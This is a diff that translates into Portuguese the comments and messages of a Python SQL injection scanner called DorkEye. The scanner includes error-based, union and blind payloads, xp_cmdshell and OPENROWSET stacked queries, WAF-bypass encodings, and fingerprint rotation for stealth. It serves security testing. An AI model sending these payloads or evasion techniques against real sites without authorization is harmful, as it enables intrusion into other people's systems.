@@ -1,9 +1,9 @@
 """
 DorkEye SQLi Detector
 ═══════════════════════════════════════════════════════════════
-Multi-method SQL injection for DorkEye Project
+SQL injection multi-método para o DorkEye Project
 
-Contains:
+Contém:
   - SQLiConfidence         enum
   - HTTPFingerprint        dataclass
   - load_http_fingerprints / resolve_reference / resolve_accept_language
@@ -41,17 +41,17 @@ from urllib3.util.retry import Retry
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ── Interrupt flags — mirrored from dorkeye.py signal handler ────────────────
+# ── Flags de interrupção — espelhadas do signal handler do dorkeye.py ────────────────
 _exit_requested: bool = False
 _skip_current:   bool = False
 
 
 # ══════════════════════════════════════════════════════════════
-#  Termux / Android auto-detection
+#  Auto-detecção Termux / Android
 # ══════════════════════════════════════════════════════════════
 
 def _detect_termux() -> bool:
-    """Return True when running inside Termux on Android."""
+    """Retorna True quando executando dentro do Termux no Android."""
     return (
         "TERMUX_VERSION" in os.environ
         or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
@@ -62,11 +62,11 @@ TERMUX_IS_ANDROID: bool = _detect_termux()
 
 
 # ══════════════════════════════════════════════════════════════
-#  Interruptible sleep
+#  Sleep interrompível
 # ══════════════════════════════════════════════════════════════
 
 def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
-    """Sleep in small steps; return immediately if an interrupt flag is set."""
+    """Dorme em passos pequenos; retorna imediatamente se uma flag de interrupção estiver definida."""
     elapsed = 0.0
     while elapsed < seconds:
         if _exit_requested or _skip_current:
@@ -80,7 +80,7 @@ def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
 # ══════════════════════════════════════════════════════════════
 
 class SQLiConfidence(Enum):
-    """Confidence levels for SQL injection findings."""
+    """Níveis de confiança para findings de SQL injection."""
     NONE     = "none"
     LOW      = "low"
     MEDIUM   = "medium"
@@ -89,12 +89,12 @@ class SQLiConfidence(Enum):
 
 
 # ══════════════════════════════════════════════════════════════
-#  HTTPFingerprint dataclass
+#  Dataclass HTTPFingerprint
 # ══════════════════════════════════════════════════════════════
 
 @dataclass
 class HTTPFingerprint:
-    """Immutable snapshot of a browser HTTP fingerprint."""
+    """Snapshot imutável de um fingerprint HTTP de navegador."""
     browser:         str
     os:              str
     user_agent:      str
@@ -109,17 +109,17 @@ class HTTPFingerprint:
 
 
 # ══════════════════════════════════════════════════════════════
-#  HTTP Fingerprinting helpers
+#  Auxiliares de HTTP Fingerprinting
 # ══════════════════════════════════════════════════════════════
 
 def load_http_fingerprints() -> Dict:
-    """Load http_fingerprints.json; return a dict tagged with _mode."""
+    """Carrega http_fingerprints.json; retorna um dict marcado com _mode."""
     fingerprint_file = Path(__file__).parent.parent / "http_fingerprints.json"
     try:
         with open(fingerprint_file, "r", encoding="utf-8") as f:
             data = json.load(f)
         if not isinstance(data, dict) or not data:
-            raise ValueError("Fingerprint file is empty or invalid")
+            raise ValueError("Arquivo de fingerprint vazio ou inválido")
         if "fingerprints" in data:
             return {
                 "_mode":             "advanced",
@@ -130,13 +130,13 @@ def load_http_fingerprints() -> Dict:
             }
         return {"_mode": "legacy", "fingerprints": data}
     except Exception as e:
-        print(f"[sqli] Warning: failed to load HTTP fingerprints: {e}", file=sys.stderr)
-        print("[sqli] HTTP fingerprinting will be disabled", file=sys.stderr)
+        print(f"[sqli] Aviso: falha ao carregar HTTP fingerprints: {e}", file=sys.stderr)
+        print("[sqli] HTTP fingerprinting será desativado", file=sys.stderr)
         return {"_mode": "disabled"}
 
 
 def resolve_reference(value: str, common_headers: Dict) -> str:
-    """Resolve a @reference token to its value in common_headers."""
+    """Resolve um token @reference para seu valor em common_headers."""
     if isinstance(value, str) and value.startswith("@"):
         key = value[1:]
         return common_headers.get(key, "")
@@ -144,7 +144,7 @@ def resolve_reference(value: str, common_headers: Dict) -> str:
 
 
 def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
-    """Pick a random language profile and return the matching Accept-Language string."""
+    """Escolhe um perfil de idioma aleatório e retorna a string Accept-Language correspondente."""
     profiles = fp_headers.get("accept_language_profiles")
     if not profiles:
         return ""
@@ -153,7 +153,7 @@ def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
 
 
 # ══════════════════════════════════════════════════════════════
-#  User-Agent pool
+#  Pool de User-Agents
 # ══════════════════════════════════════════════════════════════
 
 USER_AGENTS: Dict[str, List[str]] = {
@@ -188,7 +188,7 @@ USER_AGENTS: Dict[str, List[str]] = {
 # ══════════════════════════════════════════════════════════════
 
 class HTTPFingerprintRotator:
-    """Rotates browser fingerprint profiles on every request."""
+    """Rotaciona perfis de fingerprint de navegador a cada request."""
 
     def __init__(self):
         self.raw_fingerprints    = load_http_fingerprints()
@@ -284,7 +284,7 @@ class HTTPFingerprintRotator:
 # ══════════════════════════════════════════════════════════════
 
 class CircuitBreaker:
-    """Tracks unreachable hosts and short-circuits further requests."""
+    """Rastreia hosts inalcançáveis e curto-circuita requests futuros."""
 
     def __init__(self):
         self._dead: Set[str] = set()
@@ -304,11 +304,11 @@ class CircuitBreaker:
 
 
 # ══════════════════════════════════════════════════════════════
-#  HTMLParser-based script-tag stripper
+#  Removedor de tags script baseado em HTMLParser
 # ══════════════════════════════════════════════════════════════
 
 class _ScriptStripper(_HTMLParser):
-    """HTMLParser subclass that removes every <script>…</script> block."""
+    """Subclasse de HTMLParser que remove todo bloco <script>…</script>."""
 
     def __init__(self):
         super().__init__(convert_charrefs=False)
@@ -345,7 +345,7 @@ _SCRIPT_TAG_RE_FALLBACK = re.compile(
 
 
 def _strip_script_tags(body: str) -> str:
-    """Return body with all <script> blocks removed."""
+    """Retorna o corpo com todos os blocos <script> removidos."""
     stripper = _ScriptStripper()
     try:
         stripper.feed(body)
@@ -356,7 +356,7 @@ def _strip_script_tags(body: str) -> str:
 
 
 # ══════════════════════════════════════════════════════════════
-#  WAF detection signatures
+#  Assinaturas de detecção de WAF
 # ══════════════════════════════════════════════════════════════
 
 WAF_SIGNATURES: Dict[str, List[str]] = {
@@ -376,7 +376,7 @@ WAF_SIGNATURES: Dict[str, List[str]] = {
 
 
 # ══════════════════════════════════════════════════════════════
-#  Parameter priority tables
+#  Tabelas de prioridade de parâmetros
 # ══════════════════════════════════════════════════════════════
 
 _HIGH_PRIORITY_PARAMS: frozenset = frozenset({
@@ -395,7 +395,7 @@ _MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
 
 
 # ══════════════════════════════════════════════════════════════
-#  SQLiDetector — timing constants (Termux-aware)
+#  SQLiDetector — constantes de timing (Termux-aware)
 # ══════════════════════════════════════════════════════════════
 
 _CONNECT_TIMEOUT  = 3 if TERMUX_IS_ANDROID else 4
@@ -408,19 +408,19 @@ _MAX_BASELINE_S   = 6.0
 _PROBE_SAMPLES       = 2 if TERMUX_IS_ANDROID else 3
 _PROBE_NOISE_BUFFER  = 0.04
 _PROBE_MAX_THRESHOLD = 0.18
-_PROBE_SAMPLE_BYTES  = 8_192   # [NEW-7] cap for difflib comparison
+_PROBE_SAMPLE_BYTES  = 8_192   # [NEW-7] limite para comparação difflib
 _BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3
 _TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2
-_UNION_COLUMNS_MAX   = 6       # raised from 5 — most real apps use ≤6 cols
+_UNION_COLUMNS_MAX   = 6       # aumentado de 5 — maioria dos apps reais usa ≤6 colunas
 
-# ── [FP-1] Page-stability threshold ──────────────────────────────────────────
-# Minimum similarity between two clean requests to consider the page stable
-# enough for boolean-blind testing. Below this → boolean blind is skipped.
+# ── [FP-1] Limiar de estabilidade da página ──────────────────────────────────────────
+# Similaridade mínima entre duas requests limpas para considerar a página estável
+# o bastante para teste boolean-blind. Abaixo disso → boolean blind é pulado.
 _PAGE_STABILITY_MIN  = 0.82
 
-# ── [FP-7] Probe fast-path threshold ─────────────────────────────────────────
-# Raised from 50 → 150 bytes: small deltas (timestamps, nonces, ad counters)
-# were triggering unnecessary full-suite runs on every dynamic parameter.
+# ── [FP-7] Limiar fast-path do probe ─────────────────────────────────────────
+# Aumentado de 50 → 150 bytes: pequenos deltas (timestamps, nonces, contadores
+# de anúncios) disparavam execuções desnecessárias da suíte completa em cada parâmetro dinâmico.
 _FP_FAST_PATH_BYTES  = 150
 
 
@@ -430,17 +430,17 @@ _FP_FAST_PATH_BYTES  = 150
 
 class SQLiDetector:
     """
-    Multi-method SQL injection detector that tests GET/POST/JSON/path parameters.
+    Detector de SQL injection multi-método que testa parâmetros GET/POST/JSON/path.
 
-    Detection methods (run in order per parameter):
-      1. error_based      — injects payloads that trigger DB error signatures
-      2. union_based      — probes column count (NULL + string columns)
-      3. boolean_blind    — dual-metric: length diff + similarity ratio
-      4. time_based_blind — DB-specific SLEEP/pg_sleep/WAITFOR payloads
-      5. stacked_query    — lightweight stacked-query probe (new)
+    Métodos de detecção (executados em ordem por parâmetro):
+      1. error_based      — injeta payloads que disparam assinaturas de erro do DB
+      2. union_based      — investiga a contagem de colunas (NULL + colunas string)
+      3. boolean_blind    — dual-metric: diferença de tamanho + razão de similaridade
+      4. time_based_blind — payloads SLEEP/pg_sleep/WAITFOR específicos por DB
+      5. stacked_query    — probe leve de stacked-query (novo)
 
-    Parameters are prioritised by attack surface before testing.
-    A CircuitBreaker skips further requests to hosts that became unreachable.
+    Os parâmetros são priorizados por superfície de ataque antes do teste.
+    Um CircuitBreaker pula requests futuros para hosts que ficaram inalcançáveis.
     """
 
     # ── [NEW-2] Extended SQL error signatures ─────────────────────────────────
@@ -454,7 +454,7 @@ class SQLiDetector:
             r"mysql_fetch_(?:array|assoc|row|object)",
             r"MySQL server version for the right syntax",
             r"com\.mysql\.jdbc\.exceptions",
-            # [NEW-2] additional MySQL patterns
+            # [NEW-2] padrões adicionais de MySQL
             r"Table '.*' doesn't exist",
             r"Unknown column '.*' in 'field list'",
             r"FUNCTION .* does not exist",
@@ -468,7 +468,7 @@ class SQLiDetector:
             r"org\.postgresql\.util\.PSQLException",
             r"ERROR:\s+syntax error at or near",
             r"ERROR:\s+unterminated quoted string",
-            # [NEW-2] additional PostgreSQL patterns
+            # [NEW-2] padrões adicionais de PostgreSQL
             r"PG::SyntaxError",
             r"pg_query\(\):",
             r"ERROR:\s+invalid input syntax for",
@@ -483,7 +483,7 @@ class SQLiDetector:
             r"Microsoft OLE DB Provider for SQL Server",
             r"\[Microsoft\]\[ODBC SQL Server Driver\]",
             r"Incorrect syntax near",
-            # [NEW-2] additional MSSQL patterns
+            # [NEW-2] padrões adicionais de MSSQL
             r"SqlException",
             r"System\.Data\.SqlClient",
             r"Procedure or function .* expects parameter",
@@ -494,7 +494,7 @@ class SQLiDetector:
             r"System\.Data\.SQLite\.SQLiteException",
             r"sqlite3\.OperationalError:",
             r"near \".*\": syntax error",
-            # [NEW-2] additional SQLite patterns
+            # [NEW-2] padrões adicionais de SQLite
             r"unrecognized token:",
             r"incomplete input",
         ],
@@ -505,11 +505,11 @@ class SQLiDetector:
             r"ORA-\d{5}",
             r"oracle\.jdbc\.driver",
             r"quoted string not properly terminated",
-            # [NEW-2] additional Oracle patterns
+            # [NEW-2] padrões adicionais de Oracle
             r"PLS-\d{5}",
             r"TNS:\s+",
         ],
-        # [NEW-2] Generic bucket — catches miscellaneous DB frameworks
+        # [NEW-2] Bucket genérico — captura frameworks de DB diversos
         "generic": [
             r"syntax error.*near",
             r"unexpected end of SQL command",
@@ -530,7 +530,7 @@ class SQLiDetector:
     )
 
     def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ):
-        """Initialise with stealth flag, timeout, fingerprint rotator, circuit breaker."""
+        """Inicializa com flag stealth, timeout, rotator de fingerprint, circuit breaker."""
         self.stealth             = stealth
         self.read_timeout        = timeout
         self.circuit_breaker     = CircuitBreaker()
@@ -539,7 +539,7 @@ class SQLiDetector:
         self._status_cb          = None
 
     def _cb(self, msg: str) -> None:
-        """Send a phase/status message to the registered callback."""
+        """Envia uma mensagem de fase/status ao callback registrado."""
         if callable(self._status_cb):
             try:
                 self._status_cb(msg)
@@ -564,7 +564,7 @@ class SQLiDetector:
         return (_CONNECT_TIMEOUT, self.read_timeout + extra_read)
 
     def _run_interruptible(self, fn, total_timeout: float, on_connect_error=None):
-        """Run fn() in a daemon thread; return result or None on timeout/interrupt."""
+        """Executa fn() em uma thread daemon; retorna o resultado ou None em timeout/interrupção."""
         _POLL         = 0.1
         result_holder = [None]
         exc_holder    = [None]
@@ -597,7 +597,7 @@ class SQLiDetector:
         return None
 
     def _get(self, url: str, extra_read: float = 0) -> Optional[requests.Response]:
-        """Perform a GET request with rotated fingerprint; return Response or None."""
+        """Realiza uma request GET com fingerprint rotacionado; retorna Response ou None."""
         if self.circuit_breaker.is_dead(url):
             return None
 
@@ -627,7 +627,7 @@ class SQLiDetector:
         data:    Optional[Dict] = None,
         json_body: Optional[Dict] = None,
     ) -> Optional[requests.Response]:
-        """Perform a POST (form or JSON) with rotated fingerprint; return Response or None."""
+        """Realiza uma request POST (form ou JSON) com fingerprint rotacionado; retorna Response ou None."""
         if self.circuit_breaker.is_dead(url):
             return None
 
@@ -657,11 +657,11 @@ class SQLiDetector:
         )
 
     # ──────────────────────────────────────────────────────────
-    #  WAF Detection
+    #  Detecção de WAF
     # ──────────────────────────────────────────────────────────
 
     def _detect_waf(self, response: requests.Response) -> Optional[str]:
-        """Scan response headers and body for WAF signatures; return name or None."""
+        """Escaneia headers e corpo da resposta por assinaturas de WAF; retorna o nome ou None."""
         headers_keys   = {k.lower() for k in response.headers}
         headers_values = " ".join(v.lower() for v in response.headers.values())
         body_snippet   = response.text[:2000].lower()
@@ -677,7 +677,7 @@ class SQLiDetector:
         return None
 
     def _measure_baseline_latency(self, url: str) -> Optional[float]:
-        """Measure average response latency over _BASELINE_SAMPLES; return or None."""
+        """Mede a latência média de resposta em _BASELINE_SAMPLES amostras; retorna ou None."""
         times = []
         for _ in range(_BASELINE_SAMPLES):
             if self.circuit_breaker.is_dead(url):
@@ -697,14 +697,14 @@ class SQLiDetector:
         return baseline
 
     def has_query_params(self, url: str) -> bool:
-        """Return True if the URL contains at least one GET query parameter."""
+        """Retorna True se a URL contém ao menos um parâmetro de consulta GET."""
         try:
             return bool(parse_qs(urlparse(url).query))
         except Exception:
             return False
 
     def _extract_query_params(self, url: str) -> Dict[str, str]:
-        """Parse and return all GET query params as a flat {name: first_value} dict."""
+        """Interpreta e retorna todos os parâmetros GET como um dict plano {nome: primeiro_valor}."""
         try:
             params = parse_qs(urlparse(url).query)
             return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
@@ -712,7 +712,7 @@ class SQLiDetector:
             return {}
 
     def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
-        """Return url with param_name replaced by payload. Preserves fragment."""
+        """Retorna a URL com param_name substituído pelo payload. Preserva o fragmento."""
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
         if param_name not in params:
@@ -725,14 +725,14 @@ class SQLiDetector:
         return rebuilt
 
     def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
-        """Fetch baseline; return (status_code, body_text, body_len) or None."""
+        """Busca o baseline; retorna (status_code, corpo_texto, corpo_len) ou None."""
         response = self._get(url)
         if response is None:
             return None
         return (response.status_code, response.text, len(response.text))
 
     def _match_sql_errors(self, body: str) -> Optional[Tuple[str, str]]:
-        """Strip script tags then scan for SQL error signatures; return (db, pattern) or None."""
+        """Remove tags script e escaneia por assinaturas de erro SQL; retorna (db, padrão) ou None."""
         clean_body = _strip_script_tags(body)
         for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
             for pattern in patterns:
@@ -741,11 +741,11 @@ class SQLiDetector:
         return None
 
     # ──────────────────────────────────────────────────────────
-    #  Parameter prioritisation
+    #  Priorização de parâmetros
     # ──────────────────────────────────────────────────────────
 
     def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
-        """Sort params into high/medium/low priority; return concatenated list."""
+        """Ordena params em prioridade alta/média/baixa; retorna lista concatenada."""
         high:   List[str] = []
         medium: List[str] = []
         low:    List[str] = []
@@ -762,18 +762,18 @@ class SQLiDetector:
         return high + medium + low
 
     # ──────────────────────────────────────────────────────────
-    #  [NEW-7] Parameter probe — fast-path + 8 KB cap
+    #  [NEW-7] Probe de parâmetro — fast-path + limite de 8 KB
     # ──────────────────────────────────────────────────────────
 
     def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
         """
-        Return True if the parameter shows meaningful variation when injected with a quote.
+        Retorna True se o parâmetro mostra variação significativa quando injetado com uma aspa.
 
-        [NEW-7] Two performance improvements vs v4.9.0:
-          - Fast-path: if any response body differs from baseline by >50 bytes,
-            declare variation immediately without running difflib.
-          - difflib comparison capped at first _PROBE_SAMPLE_BYTES (8 KB) of each
-            body — same approach used in xss.py; prevents O(n²) on large pages.
+        [NEW-7] Duas melhorias de desempenho vs v4.9.0:
+          - Fast-path: se algum corpo de resposta difere do baseline em >50 bytes,
+            declara variação imediatamente sem rodar difflib.
+          - comparação difflib limitada aos primeiros _PROBE_SAMPLE_BYTES (8 KB) de cada
+            corpo — mesma abordagem usada em xss.py; evita O(n²) em páginas grandes.
         """
         if self.circuit_breaker.is_dead(url):
             return False
@@ -784,11 +784,11 @@ class SQLiDetector:
 
         baseline_status: int       = r_init.status_code
 
-        # [FP-7] Fast-path threshold raised to _FP_FAST_PATH_BYTES (150 B).
-        # The old 50-byte threshold was too easily hit by timestamps, nonces,
-        # and counter values embedded in the page body.
+        # [FP-7] Limiar fast-path aumentado para _FP_FAST_PATH_BYTES (150 B).
+        # O limiar antigo de 50 bytes era atingido facilmente demais por timestamps, nonces
+        # e valores de contadores embutidos no corpo da página.
         if abs(len(baseline_content) - len(r_init.text)) > _FP_FAST_PATH_BYTES:
-            # Still build noise baseline — just mark this sample as noisy
+            # Ainda constrói o baseline de ruído — apenas marca esta amostra como ruidosa
             noise_samples: List[float] = [0.05]
         else:
             b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
@@ -839,19 +839,19 @@ class SQLiDetector:
         return payload_noise > adaptive_threshold
 
     # ──────────────────────────────────────────────────────────
-    #  [FP-1] Page-stability pre-check
+    #  [FP-1] Pre-check de estabilidade da página
     # ──────────────────────────────────────────────────────────
 
     def _check_page_stability(self, url: str) -> float:
         """
-        Fetch url twice with no injection and measure content similarity.
-        Returns a ratio in [0.0, 1.0]:  1.0 = identical, 0.0 = completely
-        different.
+        Busca a url duas vezes sem injeção e mede a similaridade do conteúdo.
+        Retorna uma razão em [0.0, 1.0]:  1.0 = idêntico, 0.0 = completamente
+        diferente.
 
-        [FP-1] Inspired by sqlmap's checkStability(): dynamic pages (ads,
-        rotating content, timestamps) produce constant natural variation that
-        is indistinguishable from boolean-blind SQLi signals. If stability
-        falls below _PAGE_STABILITY_MIN the caller should skip boolean blind.
+        [FP-1] Inspirado no checkStability() do sqlmap: páginas dinâmicas (anúncios,
+        conteúdo rotativo, timestamps) produzem variação natural constante que é
+        indistinguível de sinais de SQLi boolean-blind. Se a estabilidade cair
+        abaixo de _PAGE_STABILITY_MIN, o chamador deve pular o boolean blind.
         """
         r1 = self._get(url)
         if r1 is None:
@@ -865,18 +865,18 @@ class SQLiDetector:
         return difflib.SequenceMatcher(None, b1, b2).ratio()
 
     # ──────────────────────────────────────────────────────────
-    #  [FP-2] Baseline SQL-error guard
+    #  [FP-2] Guard de erros SQL no baseline
     # ──────────────────────────────────────────────────────────
 
     def _baseline_has_sql_errors(self, url: str) -> bool:
         """
-        Return True if the CLEAN url already contains SQL error signatures.
+        Retorna True se a URL LIMPA já contém assinaturas de erro SQL.
 
-        [FP-2] Apps running in debug mode, broken queries in the backend, or
-        verbose ORMs can emit SQL error text on every request. Running the
-        error-based suite against such targets will always match, producing
-        100% false positives. This guard detects that condition before any
-        injection payload is sent.
+        [FP-2] Apps em modo debug, queries quebradas no backend ou ORMs
+        verbosos podem emitir texto de erro SQL em toda request. Rodar a suíte
+        error-based contra tais alvos sempre casará, produzindo 100% de falsos
+        positivos. Este guard detecta essa condição antes de qualquer
+        payload de injeção ser enviado.
         """
         r = self._get(url)
         if r is None:
@@ -884,15 +884,15 @@ class SQLiDetector:
         return self._match_sql_errors(r.text) is not None
 
     # ──────────────────────────────────────────────────────────
-    #  [1] Error-based — [NEW-1] expanded payload set
+    #  [1] Error-based — [NEW-1] conjunto de payloads expandido
     # ──────────────────────────────────────────────────────────
 
     def _test_error_based(self, url: str, param_name: str) -> Dict:
         """
-        Inject error-based payloads and look for DB error signatures.
+        Injeta payloads error-based e procura assinaturas de erro do DB.
 
-        [NEW-1] Expanded from 3 to 22 payloads covering all 5 DB engines
-        plus 4 WAF-bypass comment variants.
+        [NEW-1] Expandido de 3 para 22 payloads cobrindo os 5 engines de DB
+        mais 4 variantes de comentário WAF-bypass.
         """
         result = {
             "method":     "error_based",
@@ -902,46 +902,46 @@ class SQLiDetector:
             "waf":        None,
         }
 
-        # ── [FP-2] Baseline SQL-error guard ──────────────────────────────────
-        # If the clean page already shows SQL errors, every payload will match
-        # → guaranteed false positives. Skip entirely.
+        # ── [FP-2] Guard de erros SQL no baseline ──────────────────────────────
+        # Se a página limpa já exibe erros SQL, todo payload casará
+        # → falsos positivos garantidos. Pula inteiramente.
         if self._baseline_has_sql_errors(url):
             result["evidence"].append(
-                "[FP-guard] SQL error signatures found in clean baseline — "
-                "error-based test skipped to avoid false positives"
+                "[FP-guard] Assinaturas de erro SQL encontradas no baseline limpo — "
+                "teste error-based pulado para evitar falsos positivos"
             )
             return result
 
         # ── [NEW-1] Full payload set ──────────────────────────────────────────
         payloads = [
             # ── MySQL / MariaDB ───────────────────────────────────────────────
-            # extractvalue — triggers XPATH error with payload content
+            # extractvalue — dispara erro XPATH com conteúdo do payload
             "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
             "1 AND extractvalue(0,concat(0x7e,'TEST',0x7e))",
-            # updatexml — alternative XPATH error vector
+            # updatexml — vetor alternativo de erro XPATH
             "1' AND updatexml(0,concat(0x7e,'TEST'),0) AND '1'='1",
-            # floor/rand GROUP BY — classic MySQL error-based
+            # floor/rand GROUP BY — error-based clássico do MySQL
             (
                 "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,'TEST',"
                 "0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
             ),
-            # Double query via subselect
+            # Query dupla via subselect
             "1 AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x"
             " FROM information_schema.tables GROUP BY x)a)",
 
             # ── Microsoft SQL Server ──────────────────────────────────────────
-            # CAST to int causes type-conversion error
+            # CAST para int causa erro de conversão de tipo
             "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) AS INT)",
             "1' AND 1=CONVERT(int,(SELECT TOP 1 'TEST'))--",
-            # xp_cmdshell — triggers permission/feature error that leaks DB context
+            # xp_cmdshell — dispara erro de permissão/feature que vaza contexto do DB
             "1'; EXEC xp_cmdshell('TEST')--",
-            # OPENROWSET error
+            # Erro OPENROWSET
             "1'; SELECT * FROM OPENROWSET('SQLOLEDB','TEST','')--",
 
             # ── PostgreSQL ────────────────────────────────────────────────────
             "1 AND 1=CAST('TEST' AS INT)",
             "1' AND 1=CAST(version() AS INT)--",
-            # pg_sleep(0) — triggers function error on non-PG targets
+            # pg_sleep(0) — dispara erro de função em alvos não-PG
             "1; SELECT pg_sleep(0)--",
 
             # ── Oracle ────────────────────────────────────────────────────────
@@ -953,18 +953,18 @@ class SQLiDetector:
             "1'; SELECT NULL#",
             "1\"--",
             "1'--",
-            # Stacked with sleep(0) — often reveals stacked-query capability
+            # Stacked com sleep(0) — frequentemente revela capacidade de stacked-query
             "1'; SELECT SLEEP(0)--",
             "1'; WAITFOR DELAY '0:0:0'--",
 
             # ── [NEW-1] WAF-bypass comment variants ───────────────────────────
-            # Inline MySQL comments break simple keyword filters
+            # Comentários inline do MySQL quebram filtros simples de palavra-chave
             "1'/**/AND/**/extractvalue(0,concat(0x7e,'TEST',0x7e))/**/AND/**/'1'='1",
-            # MySQL conditional comment (/*! ... */) — executes only on MySQL
+            # Comentário condicional do MySQL (/*! ... */) — executa só no MySQL
             "1'/*!AND*/extractvalue(0,concat(0x7e,'TEST',0x7e))/*!AND*/'1'='1",
-            # URL-encoded quote + space — bypasses WAFs that decode lazily
+            # Aspa URL-encoded + espaço — bypassa WAFs que decodificam preguiçosamente
             "1%27%20AND%20extractvalue(0,concat(0x7e,%27TEST%27,0x7e))%20AND%20%271%27=%271",
-            # Doubled single-quote escape (for apps using addslashes improperly)
+            # Escape de aspa simples dobrada (para apps que usam addslashes de forma imprópria)
             "1'' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND ''1''=''1",
         ]
 
@@ -982,27 +982,27 @@ class SQLiDetector:
             waf = self._detect_waf(response)
             if waf:
                 result["waf"] = waf
-                result["evidence"].append(f"WAF detected ({waf}): error-based skipped")
+                result["evidence"].append(f"WAF detectado ({waf}): error-based pulado")
                 break
 
             match = self._match_sql_errors(response.text)
             if match:
                 db_type, pattern = match
                 result["vulnerable"] = True
-                # [FP-6] Generic SQL error signatures ("syntax error near",
-                # "data type mismatch", etc.) can appear in framework errors,
-                # JavaScript output, or ORM messages without any injection.
-                # Cap their confidence at LOW and flag the risk.
+                # [FP-6] Assinaturas de erro SQL genéricas ("syntax error near",
+                # "data type mismatch", etc.) podem aparecer em erros de framework,
+                # saída JavaScript ou mensagens de ORM sem nenhuma injeção.
+                # Limita a confiança delas a LOW e sinaliza o risco.
                 if db_type == "generic":
                     result["confidence"] = SQLiConfidence.LOW.value
                     result["evidence"].append(
-                        f"GENERIC error signature matched: {pattern[:60]} — "
-                        f"confidence capped at LOW (high FP risk; verify manually)"
+                        f"Assinatura de erro GENÉRICA casada: {pattern[:60]} — "
+                        f"confiança limitada a LOW (alto risco de FP; verifique manualmente)"
                     )
                 else:
                     result["confidence"] = SQLiConfidence.HIGH.value
                     result["evidence"].append(
-                        f"{db_type.upper()} error signature matched: {pattern[:60]}"
+                        f"Assinatura de erro {db_type.upper()} casada: {pattern[:60]}"
                     )
                 return result
 
@@ -1012,18 +1012,18 @@ class SQLiDetector:
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  [2] Union-based — [NEW-8] NULL + string column probing
+    #  [2] Union-based — [NEW-8] sondagem de colunas NULL + string
     # ──────────────────────────────────────────────────────────
 
     def _test_union_based(self, url: str, param_name: str, baseline_len: int) -> Dict:
         """
-        Probe UNION SELECT column counts and look for mismatch errors or
-        abnormal response sizes.
+        Investiga contagens de colunas UNION SELECT e procura erros de mismatch ou
+        tamanhos de resposta anormais.
 
-        [NEW-8] Tests two column-type strategies per column count:
-          - NULL columns  — works on most DB types
-          - String columns ('a','b',...) — handles targets that reject NULL
-            but accept string literals (seen on some Oracle/MSSQL setups)
+        [NEW-8] Testa duas estratégias de tipo de coluna por contagem:
+          - Colunas NULL  — funciona na maioria dos tipos de DB
+          - Colunas string ('a','b',...) — lida com alvos que rejeitam NULL
+            mas aceitam literais string (visto em alguns setups Oracle/MSSQL)
         """
         result = {
             "method":     "union_based",
@@ -1045,7 +1045,7 @@ class SQLiDetector:
             null_cols = ",".join(["NULL"] * n_cols)
             str_cols  = string_cols(n_cols)
 
-            # [NEW-8] Two payload groups: NULL and string-literal columns
+            # [NEW-8] Dois grupos de payloads: colunas NULL e literais string
             payloads = [
                 # NULL-based
                 f"' UNION SELECT {null_cols}--",
@@ -1070,7 +1070,7 @@ class SQLiDetector:
                 if waf:
                     result["waf"] = waf
                     result["evidence"].append(
-                        f"WAF detected ({waf}): UNION probe aborted at {n_cols} cols"
+                        f"WAF detectado ({waf}): probe UNION abortado em {n_cols} colunas"
                     )
                     return result
 
@@ -1080,7 +1080,7 @@ class SQLiDetector:
                     if n_cols not in mismatch_at:
                         mismatch_at.append(n_cols)
                         result["evidence"].append(
-                            f"UNION col-mismatch at n={n_cols} — server processes UNION"
+                            f"Col-mismatch UNION em n={n_cols} — servidor processa UNION"
                         )
                     break
 
@@ -1090,7 +1090,7 @@ class SQLiDetector:
                     result["vulnerable"] = True
                     result["confidence"] = SQLiConfidence.HIGH.value
                     result["evidence"].append(
-                        f"UNION triggered {db_type.upper()} error at n={n_cols}: "
+                        f"UNION disparou erro {db_type.upper()} em n={n_cols}: "
                         f"{pattern[:50]}"
                     )
                     return result
@@ -1102,8 +1102,8 @@ class SQLiDetector:
                     result["vulnerable"] = True
                     result["confidence"] = SQLiConfidence.MEDIUM.value
                     result["evidence"].append(
-                        f"UNION SELECT {n_cols} cols: response Δ={len_diff}B "
-                        f"(prev mismatches at cols {mismatch_at})"
+                        f"UNION SELECT {n_cols} colunas: resposta Δ={len_diff}B "
+                        f"(mismatches anteriores nas colunas {mismatch_at})"
                     )
                     return result
 
@@ -1114,30 +1114,30 @@ class SQLiDetector:
             result["vulnerable"] = True
             result["confidence"] = SQLiConfidence.LOW.value
             result["evidence"].append(
-                f"UNION col-mismatch at col(s) {mismatch_at}: "
-                f"UNION syntax processed by server"
+                f"Col-mismatch UNION na(s) coluna(s) {mismatch_at}: "
+                f"sintaxe UNION processada pelo servidor"
             )
 
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  [3] Boolean blind — [NEW-4]+[NEW-5] dual metric + more pairs
+    #  [3] Boolean blind — [NEW-4]+[NEW-5] métrica dupla + mais pares
     # ──────────────────────────────────────────────────────────
 
     def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int,
                              baseline_content: str) -> Dict:
         """
-        Send true/false boolean pairs and detect statistically significant differences.
